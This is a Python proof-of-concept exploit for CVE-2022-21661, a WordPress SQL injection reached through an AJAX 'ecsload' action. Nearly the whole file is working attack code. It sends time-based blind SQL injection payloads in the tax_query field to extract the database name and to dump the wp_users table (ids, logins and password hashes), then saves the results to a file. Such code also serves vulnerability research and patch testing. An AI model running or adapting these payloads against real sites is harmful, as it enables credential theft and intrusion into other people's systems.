#!/usr/bin/env python3

from argparse import ArgumentParser
import sys
import requests
import string
import time
import termios
from multiprocessing import Pool

requests.packages.urllib3.\
disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

CLEAR_SCREEN = "\033[H\033[2J\033[3J"

PAYLOAD_DB_LEN = """{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["(CASE WHEN (select LENGTH(database()) = '%s') THEN SLEEP(2) ELSE 2070 END)"]}}}"""
PAYLOAD_DB_NAME = """{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["(CASE WHEN (select SUBSTRING(LOWER(database()),%d,1) = '%s') THEN SLEEP(2) ELSE 2070 END)"]}}}"""
PAYLOAD_USR_DMP_LEN = """{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["(CASE WHEN (select LENGTH((select Group_CONCAT(id,':',user_login,':',user_pass,',') from wp_users)) = '%s') THEN SLEEP(2) ELSE 2070 END)"]}}}"""
"""
 This query is used to extract the data from the table in one go!
 select Group_CONCAT(id,":",user_login,":",user_pass,"|") from wp_users
"""
PAYLOAD_USR_DUMP = """{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["(CASE WHEN (select SUBSTRING((select Group_CONCAT(id,':',user_login,':',user_pass,',') from wp_users),%d,1) = BINARY '%s') THEN SLEEP(2) ELSE 2070 END)"]}}}"""

config = {

	"proxies":{
		'http':'http://127.0.0.1:8080',
		'https':'http://127.0.0.1:8080'
	},

	"data": {
		"action":"ecsload",
		"query": "",
		"ecs_ajax_settings": """{"post_id":"1", "current_page":1, "widget_id":1, "theme_id":1, "max_num_pages":10}"""
	}
}


def log(msg):
	fd = sys.stdin.fileno()
	old = termios.tcgetattr(fd)
	new = termios.tcgetattr(fd)
	new[3] = new[3] & ~termios.ECHO  # lflags
	try:
		termios.tcsetattr(fd, termios.TCSADRAIN, new)
		sys.stdout.write(CLEAR_SCREEN)
		sys.stdout.write("%s\n" % msg)
	finally:
		termios.tcsetattr(fd, termios.TCSADRAIN, old)


def do_request(url, query, proxy=False):
	data = config['data']
	data['query'] = query
	start = time.time()
	r = requests.post(url, data=data, verify=False)
	"""
	 Status 500  might not allways be true, in testing the theme has a pro version 
	seems that the feature that triggers the bug is available is for pro.
	or might be a configuration issue, the key point is the timing.... 
	"""
	if r.status_code == 500:
		end = time.time()
		diff = end - start
		return diff >= 2.00


def find_length(url, query):
	length = 0
	for i in range(1, 1000):
		tmp =  query % i
		log("Searching for length:\nTrying len %d" % i)
		r = do_request(url, tmp)
		if r == True:
			length = i
			break
	log("length is %d" % length)
	return length


def extract(url, query, idx):
	chars = string.ascii_letters + string.digits + string.punctuation
	for c in chars:
		tmp = query % (idx, c)
		r = do_request(url, tmp)
		if r == True:
			return idx, c
	return (idx, "?")


def errcallback(args):
	print(f"error {args}")


def exploit(url, query_len, query) -> str:
	print("Finding lenght.")
	length = 0
	value = []
	length = find_length(url, query_len)
	log("length Found is %d" % length)
	# we found the length time to extract the value
	pool = Pool(processes=3)
	value = list("- " * length)

	# define a local callback function
	def callback(args):
		idx, cr = args
		# set the value at its position
		value[(idx -1)]= cr
		# the value in the postion (idx - 1 ) is pushed to the end so remove 1
		value.pop()
		#print(args)
		log(f'Retrieving string: {"".join(value)}')

	print(f'Retrieving string: {"".join(value)}')
	for i in range(1,length+1):
		pool.apply_async(extract, args=(url, query, i,), callback=callback, error_callback=errcallback)

	pool.close()
	pool.join()
	
	return values_to_str(value)

def values_to_str(value):
    return "".join(value)


if __name__ == '__main__':
	parser = ArgumentParser(description='Performs a POC exploitation of the vulnerability CVE-2022-21661 to retrieve database information (database name or users)')
	parser.add_argument('url', help="URL to do the exploit (it should be http://localhost:8000//wp-admin/admin-ajax.php", type=str)
	parser.add_argument('payload', help='Exploit option id. Use 1 to exploit the db name or 2 to dump the users table', type=int)
	parser.add_argument('-l', '--limit-users', help='Use it to limit the users retrieved by the payload 2', type=int)
	parser.add_argument("-o", "--output", help='File to store results', type=str, nargs='?')
	args = parser.parse_args()
	
	print(args)

	url = args.url
	payload = args.payload
	limit_retrived_users = args.limit_users
	output = args.output


	result = ""
	if payload == 1:
		result = exploit(sys.argv[1], PAYLOAD_DB_LEN, PAYLOAD_DB_NAME)
	elif payload == 2:
		if limit_retrived_users:
			limit_retrived_users = str(limit_retrived_users)
			PAYLOAD_USR_DMP_LEN = """{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["(CASE WHEN (SELECT LENGTH(Group_CONCAT(users.id,':',users.user_login,':',users.user_pass,',')) FROM (SELECT id, user_login, user_pass FROM wp_users LIMIT """+limit_retrived_users+""") AS users) = '%s' THEN SLEEP(2) ELSE 2070 END)"]}}}"""
			PAYLOAD_USR_DUMP = """{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["(CASE WHEN (select SUBSTRING((SELECT Group_CONCAT(users.id,':',users.user_login,':',users.user_pass,',') FROM (SELECT id, user_login, user_pass FROM wp_users LIMIT """+limit_retrived_users+""") AS users),%d, 1) = BINARY '%s')THEN SLEEP(2) ELSE 2070 END)"]}}}"""
		result = exploit(sys.argv[1], PAYLOAD_USR_DMP_LEN, PAYLOAD_USR_DUMP)

	if output is not None:
		with open(output, 'w') as file:
			file.write(result.replace(',,', ',').replace(',', '\n').replace(':',','))
